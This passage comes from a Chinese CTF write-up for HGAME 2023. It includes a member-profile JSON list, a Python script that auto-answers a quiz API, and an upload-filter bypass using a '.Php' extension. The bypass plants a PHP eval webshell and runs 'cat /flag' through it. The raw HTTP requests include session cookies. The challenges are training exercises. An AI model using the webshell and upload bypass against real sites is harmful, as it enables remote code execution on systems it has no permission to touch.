class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;url&quot;</span><span class="punctuation">:</span> <span class="string">&quot;https://cyris.moe/&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span><span class="punctuation">,</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;id&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Acaleph&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;intro&quot;</span><span class="punctuation">:</span> <span class="string">&quot;16 级 / Web 前端 / 水母一小只 / 程序员鼓励师 / Cy 来组饥荒！&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;avatar&quot;</span><span class="punctuation">:</span> <span class="string">&quot;../../images/avatar/Acaleph.jpg&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;url&quot;</span><span class="punctuation">:</span> <span class="string">&quot;#&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span><span class="punctuation">,</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;id&quot;</span><span class="punctuation">:</span> <span class="string">&quot;b0lv42&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;intro&quot;</span><span class="punctuation">:</span> <span class="string">&quot;16级 / 大果子 / 毕业1年仍在寻找vidar娘接盘侠&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;avatar&quot;</span><span class="punctuation">:</span> <span class="string">&quot;../../images/avatar/b0lv42.jpg&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;url&quot;</span><span class="punctuation">:</span> <span class="string">&quot;https://b0lv42.github.io/&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span><span class="punctuation">,</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;id&quot;</span><span class="punctuation">:</span> <span class="string">&quot;ngc7293&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;intro&quot;</span><span class="punctuation">:</span> <span class="string">&quot;16 级 / 蟒蛇饲养员 / 高数小王子&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;avatar&quot;</span><span class="punctuation">:</span> <span class="string">&quot;../../images/avatar/ngc7293.jpg&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;url&quot;</span><span class="punctuation">:</span> <span class="string">&quot;https://ngc7292.github.io/&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span><span class="punctuation">,</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;id&quot;</span><span class="punctuation">:</span> <span class="string">&quot;ckj123&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;intro&quot;</span><span class="punctuation">:</span> <span class="string">&quot;16 级 / Web / 菜鸡第一人&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;avatar&quot;</span><span class="punctuation">:</span> <span class="string">&quot;../../images/avatar/ckj123.jpg&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;url&quot;</span><span class="punctuation">:</span> <span class="string">&quot;https://www.ckj123.com&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span><span class="punctuation">,</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;id&quot;</span><span class="punctuation">:</span> <span class="string">&quot;cru5h&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;intro&quot;</span><span class="punctuation">:</span> <span class="string">&quot;16级 / 前web手、现pwn手 / 菜鸡研究生 / scu&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;avatar&quot;</span><span class="punctuation">:</span> <span class="string">&quot;https://thirdqq.qlogo.cn/g?b=sdk&amp;k=5kpiaPnLZ1cWrp0G8O4qHDg&amp;s=640&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;url&quot;</span><span class="punctuation">:</span> <span class="string">&quot;#&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span><span class="punctuation">,</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;id&quot;</span><span class="punctuation">:</span> <span class="string">&quot;xiaoyao52110&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;intro&quot;</span><span class="punctuation">:</span> <span class="string">&quot;16 级 / Bin 打杂 / 他们说菜都是假的，我是真的&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;avatar&quot;</span><span class="punctuation">:</span> <span class="string">&quot;../../images/avatar/xiaoyao52110.jpg&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;url&quot;</span><span class="punctuation">:</span> <span class="string">&quot;#&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span><span class="punctuation">,</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;id&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Undefinedv&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;intro&quot;</span><span class="punctuation">:</span> <span class="string">&quot;15 级网安协会会长 / Web 安全&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;avatar&quot;</span><span class="punctuation">:</span> <span class="string">&quot;../../images/avatar/undefinedv.jpg&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;url&quot;</span><span class="punctuation">:</span> <span class="string">&quot;#&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span><span class="punctuation">,</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;id&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Spine&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;intro&quot;</span><span class="punctuation">:</span> <span class="string">&quot;逆向 / 二进制安全&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;avatar&quot;</span><span class="punctuation">:</span> <span class="string">&quot;../../images/avatar/spine.jpg&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;url&quot;</span><span class="punctuation">:</span> <span class="string">&quot;#&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span><span class="punctuation">,</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;id&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Tata&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;intro&quot;</span><span class="punctuation">:</span> <span class="string">&quot;二进制 CGC 入门水准 / 半吊子爬虫与反爬虫&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;avatar&quot;</span><span class="punctuation">:</span> <span class="string">&quot;../../images/avatar/tata.jpg&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;url&quot;</span><span class="punctuation">:</span> <span class="string">&quot;#&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span><span class="punctuation">,</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;id&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Airbasic&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;intro&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Web 安全 / 长亭科技安服部门 / TSRC 2015 年年度英雄榜第八、2016 年年度英雄榜第十三&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;avatar&quot;</span><span class="punctuation">:</span> <span class="string">&quot;../../images/avatar/airbasic.jpg&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;url&quot;</span><span class="punctuation">:</span> <span class="string">&quot;#&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span><span class="punctuation">,</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;id&quot;</span><span class="punctuation">:</span> <span class="string">&quot;jibo&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;intro&quot;</span><span class="punctuation">:</span> <span class="string">&quot;15 级 / 什么都不会的开发 / 打什么都菜&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;avatar&quot;</span><span class="punctuation">:</span> <span class="string">&quot;../../images/avatar/jibo.jpg&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;url&quot;</span><span class="punctuation">:</span> <span class="string">&quot;#&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span><span class="punctuation">,</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;id&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Processor&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;intro&quot;</span><span class="punctuation">:</span> <span class="string">&quot;15 级 Vidar 会长 / 送分型逆向选手 / 13 段剑纯 / 差点没毕业 / 阿斯巴甜有点甜&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;avatar&quot;</span><span class="punctuation">:</span> <span class="string">&quot;../../images/avatar/Processor.jpeg&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;url&quot;</span><span class="punctuation">:</span> <span class="string">&quot;https://processor.pub/&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span><span class="punctuation">,</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;id&quot;</span><span class="punctuation">:</span> <span class="string">&quot;HeartSky&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;intro&quot;</span><span class="punctuation">:</span> <span class="string">&quot;15 级 / 挖不到洞 / 打不动 CTF / 内网渗透不了 / 工具写不出&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;avatar&quot;</span><span class="punctuation">:</span> <span class="string">&quot;../../images/avatar/heartsky.jpg&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;url&quot;</span><span class="punctuation">:</span> <span class="string">&quot;http://heartsky.info&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span><span class="punctuation">,</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;id&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Minygd&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;intro&quot;</span><span class="punctuation">:</span> <span class="string">&quot;15 级 / 删库跑路熟练工 / 没事儿拍个照 / 企鹅&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;avatar&quot;</span><span class="punctuation">:</span> <span class="string">&quot;../../images/avatar/mingy.jpg&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;url&quot;</span><span class="punctuation">:</span> <span class="string">&quot;#&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span><span class="punctuation">,</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;id&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Yotubird&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;intro&quot;</span><span class="punctuation">:</span> <span class="string">&quot;15 级 / 已入 Python 神教&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;avatar&quot;</span><span class="punctuation">:</span> <span class="string">&quot;../../images/avatar/Yotubird.png&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;url&quot;</span><span class="punctuation">:</span> <span class="string">&quot;#&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span><span class="punctuation">,</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;id&quot;</span><span class="punctuation">:</span> <span class="string">&quot;c014&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;intro&quot;</span><span class="punctuation">:</span> <span class="string">&quot;15 级 / Web 🐶 / 汪汪汪&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;avatar&quot;</span><span class="punctuation">:</span> <span class="string">&quot;../../images/avatar/c014.png&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;url&quot;</span><span class="punctuation">:</span> <span class="string">&quot;#&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span><span class="punctuation">,</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;id&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Explorer&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;intro&quot;</span><span class="punctuation">:</span> <span class="string">&quot;14 级 HDUISA 会长 / 二进制安全 / 曾被 NULL、TD、蓝莲花等拉去凑人数 / 差点没毕业 / 长亭安研&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;avatar&quot;</span><span class="punctuation">:</span> <span class="string">&quot;../../images/avatar/Explorer.jpg&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;url&quot;</span><span class="punctuation">:</span> <span class="string">&quot;#&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span><span class="punctuation">,</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;id&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Aklis&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;intro&quot;</span><span class="punctuation">:</span> <span class="string">&quot;14 级 HDUISA 副会长 / 二次元 / 拼多多安全工程师&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;avatar&quot;</span><span class="punctuation">:</span> <span class="string">&quot;../../images/avatar/aklis.jpg&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;url&quot;</span><span class="punctuation">:</span> <span class="string">&quot;#&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span><span class="punctuation">,</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;id&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Sysorem&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;intro&quot;</span><span class="punctuation">:</span> <span class="string">&quot;14 级网安协会会长 / HDUISA 成员 / Web 安全 / Freebuf 安全社区特约作者 / FSI2015Freebuf 特邀嘉宾&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;avatar&quot;</span><span class="punctuation">:</span> <span class="string">&quot;../../images/avatar/sysorem.jpg&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;url&quot;</span><span class="punctuation">:</span> <span class="string">&quot;#&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span><span class="punctuation">,</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;id&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Hcamael&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;intro&quot;</span><span class="punctuation">:</span> <span class="string">&quot;13 级 / 知道创宇 404 安全研究员 / 现在 Nu1L 划划水 / IoT、Web、二进制漏洞，密码学，区块链都看得懂一点，但啥也不会&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;avatar&quot;</span><span class="punctuation">:</span> <span class="string">&quot;../../images/avatar/hcamael.jpg&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;url&quot;</span><span class="punctuation">:</span> <span class="string">&quot;#&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span><span class="punctuation">,</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;id&quot;</span><span class="punctuation">:</span> <span class="string">&quot;LoRexxar&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;intro&quot;</span><span class="punctuation">:</span> <span class="string">&quot;14 级 / Web 🐶 / 杭电江流儿 / 自走棋主教守门员&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;avatar&quot;</span><span class="punctuation">:</span> <span class="string">&quot;../../images/avatar/lorexxar.jpg&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;url&quot;</span><span class="punctuation">:</span> <span class="string">&quot;https://lorexxar.cn/&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span><span class="punctuation">,</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;id&quot;</span><span class="punctuation">:</span> <span class="string">&quot;A1ex&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;intro&quot;</span><span class="punctuation">:</span> <span class="string">&quot;14 级网安协会副会长 / Web 安全&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;avatar&quot;</span><span class="punctuation">:</span> <span class="string">&quot;../../images/avatar/alex.jpg&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;url&quot;</span><span class="punctuation">:</span> <span class="string">&quot;#&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span><span class="punctuation">,</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;id&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Ahlaman&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;intro&quot;</span><span class="punctuation">:</span> <span class="string">&quot;14 级网安协会副会长 / 无线安全&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;avatar&quot;</span><span class="punctuation">:</span> <span class="string">&quot;../../images/avatar/ahlaman.jpg&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;url&quot;</span><span class="punctuation">:</span> <span class="string">&quot;#&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span><span class="punctuation">,</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;id&quot;</span><span class="punctuation">:</span> <span class="string">&quot;lightless&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;intro&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Web 安全 / 安全工程师 / 半吊子开发 / 半吊子安全研究&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;avatar&quot;</span><span class="punctuation">:</span> <span class="string">&quot;../../images/avatar/lightless.jpg&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;url&quot;</span><span class="punctuation">:</span> <span class="string">&quot;https://lightless.me/&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span><span class="punctuation">,</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;id&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Edward_L&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;intro&quot;</span><span class="punctuation">:</span> <span class="string">&quot;13 级 HDUISA 会长 / Web 安全 / 华为安全部门 / 二进制安全，fuzz，符号执行方向研究&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;avatar&quot;</span><span class="punctuation">:</span> <span class="string">&quot;../../images/avatar/edward_L.jpg&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;url&quot;</span><span class="punctuation">:</span> <span class="string">&quot;#&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span><span class="punctuation">,</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;id&quot;</span><span class="punctuation">:</span> <span class="string">&quot;逆风&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;intro&quot;</span><span class="punctuation">:</span> <span class="string">&quot;13 级菜鸡 / 大数据打杂&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;avatar&quot;</span><span class="punctuation">:</span> <span class="string">&quot;../../images/avatar/deadwind4.jpeg&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;url&quot;</span><span class="punctuation">:</span> <span class="string">&quot;https://github.com/deadwind4&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span><span class="punctuation">,</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;id&quot;</span><span class="punctuation">:</span> <span class="string">&quot;陈斩仙&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;intro&quot;</span><span class="punctuation">:</span> <span class="string">&quot;什么都不会 / 咸鱼研究生 / &lt;del&gt;安恒&lt;/del&gt;、&lt;del&gt;长亭&lt;/del&gt; / SJTU&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;avatar&quot;</span><span class="punctuation">:</span> <span class="string">&quot;../../images/avatar/chenzhanxian.jpg&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;url&quot;</span><span class="punctuation">:</span> <span class="string">&quot;https://mxgcccc4.github.io/&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span><span class="punctuation">,</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;id&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Eric&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;intro&quot;</span><span class="punctuation">:</span> <span class="string">&quot;渗透 / 人工智能 / 北师大博士在读&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;avatar&quot;</span><span class="punctuation">:</span> <span class="string">&quot;../../images/avatar/eric.jpg&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;url&quot;</span><span class="punctuation">:</span> <span class="string">&quot;https://3riccc.github.io&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span><span class="punctuation">]</span></span><br></pre></td></tr></table></figure><p><code>exp.py</code></p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;./database.json&quot;</span>,<span class="string">&#x27;r&#x27;</span>,encoding=<span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> load_f:</span><br><span class="line">    load_dict = json.load(load_f)</span><br><span class="line"></span><br><span class="line">session = requests.session()</span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    </span><br><span class="line">    question_url = <span class="string">&#x27;http://week-1.hgame.lwsec.cn:30466/api/getQuestion&#x27;</span></span><br><span class="line">    verify_url = <span class="string">&#x27;http://week-1.hgame.lwsec.cn:30466/api/verifyAnswer&#x27;</span></span><br><span class="line">    getscore_url = <span class="string">&#x27;http://week-1.hgame.lwsec.cn:30466/api/getScore&#x27;</span></span><br><span class="line">    data = &#123;</span><br><span class="line">        <span class="string">&#x27;id&#x27;</span>: <span class="string">&#x27;&#x27;</span></span><br><span class="line">    &#125;</span><br><span class="line">    response_q = session.get(url=question_url)</span><br><span class="line">    res = re.findall(<span class="string">&#x27;&quot;.*?&quot;&#x27;</span>,response_q.text)[<span class="number">1</span>]</span><br><span class="line">    <span class="keyword">for</span> info <span class="keyword">in</span> load_dict:</span><br><span class="line">        <span class="keyword">if</span>(info[<span class="string">&#x27;intro&#x27;</span>]==res[<span class="number">1</span>:-<span class="number">1</span>]):</span><br><span class="line">            <span class="built_in">print</span>(info[<span class="string">&#x27;id&#x27;</span>])</span><br><span class="line">            data = &#123;</span><br><span class="line">                <span class="string">&#x27;id&#x27;</span>: info[<span class="string">&#x27;id&#x27;</span>]</span><br><span class="line">            &#125;</span><br><span class="line">    </span><br><span class="line">    response = session.post(url=verify_url,data=data)</span><br><span class="line">    <span class="built_in">print</span>(response.text)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;Correct&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> response.text:</span><br><span class="line">        <span class="built_in">print</span>(response_q.text)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    response = session.get(url=getscore_url)</span><br><span class="line">    <span class="built_in">print</span>(response.text)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;100&#x27;</span> <span class="keyword">in</span> response.text:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="comment"># break</span></span><br></pre></td></tr></table></figure><p>成功跑完即可得到<code>flag</code></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hgame&#123;Guess_who_i_am^Happy_Crawler&#125;</span><br></pre></td></tr></table></figure><h3 id="Show-Me-Your-Beauty"><a href="#Show-Me-Your-Beauty" class="headerlink" title="Show Me Your Beauty"></a>Show Me Your Beauty</h3><p>用<code>Php</code>后缀绕过</p><figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/upload.php</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>week-1.hgame.lwsec.cn:32057</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>205</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>*/*</span><br><span class="line"><span class="attribute">X-Requested-With</span><span class="punctuation">: </span>XMLHttpRequest</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>multipart/form-data; boundary=----WebKitFormBoundaryhpSA34RZsdEhzob1</span><br><span class="line"><span class="attribute">Origin</span><span class="punctuation">: </span>http://week-1.hgame.lwsec.cn:32057</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>http://week-1.hgame.lwsec.cn:32057/</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>session=MTY3MjkzMTY3NXxEdi1CQkFFQ180SUFBUkFCRUFBQU9fLUNBQUlHYzNSeWFXNW5EQWdBQm5OdmJIWmxaQU5wYm5RRUFnQUVCbk4wY21sdVp3d05BQXRqYUdGc2JHVnVaMlZKWkFOcGJuUUVBZ0ItfEpkrqBezOGq9RBd9KmLkzyDgKVjXFwrAT9nHfmQOxAS; PHPSESSID=jpl68kvmg4r5ivdebfb84sa9k1</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"></span><br><span class="line"><span class="language-php">------WebKitFormBoundaryhpSA34RZsdEhzob1</span></span><br><span class="line"><span class="language-php">Content-Disposition: form-data; name=<span class="string">&quot;file&quot;</span>; filename=<span class="string">&quot;a.Php&quot;</span></span></span><br><span class="line"><span class="language-php">Content-Type: image/jpeg</span></span><br><span class="line"><span class="language-php"></span></span><br><span class="line"><span class="language-php"><span class="meta">&lt;?php</span> @<span class="keyword">eval</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>]);<span class="meta">?&gt;</span></span></span><br><span class="line"><span class="language-php">------WebKitFormBoundaryhpSA34RZsdEhzob1--</span></span><br><span class="line"><span class="language-php"></span></span><br><span class="line"><span class="language-php"></span></span><br></pre></td></tr></table></figure><p>执行命令即可</p><figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/img/a.Php?a=system(&quot;cat+/flag&quot;);</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>week-1.hgame.lwsec.cn:32057</span><br><span class="line"><span class="attribute">Pragma</span><span class="punctuation">: </span>no-cache</span><br><span class="line"><span class="attribute">Cache-Control</span><span class="punctuation">: </span>no-cache</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>session=MTY3MjkzMTY3NXxEdi1CQkFFQ180SUFBUkFCRUFBQU9fLUNBQUlHYzNSeWFXNW5EQWdBQm5OdmJIWmxaQU5wYm5RRUFnQUVCbk4wY21sdVp3d05BQXRqYUdGc2JHVnVaMlZKWkFOcGJuUUVBZ0ItfEpkrqBezOGq9RBd9KmLkzyDgKVjXFwrAT9nHfmQOxAS; PHPSESSID=jpl68kvmg4r5ivdebfb84sa9k1</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>得到<code>flag</code></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hgame&#123;Unsave_F1L5_SYS7em_UPL0ad!&#125;</span><br></pre></td></tr></table></figure><h2 id="Week2"><a href="#Week2" class="headerlink" title="Week2"></a>Week2</h2><h3 id="Git-Leakage"><a href="#Git-Leakage" class="headerlink" title="Git Leakage"></a>Git Leakage</h3><p>使用<code>GitHack</code>扫描<code>/.git/</code>页面即可下载<code>Th1s_1s-flag</code>文件</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span 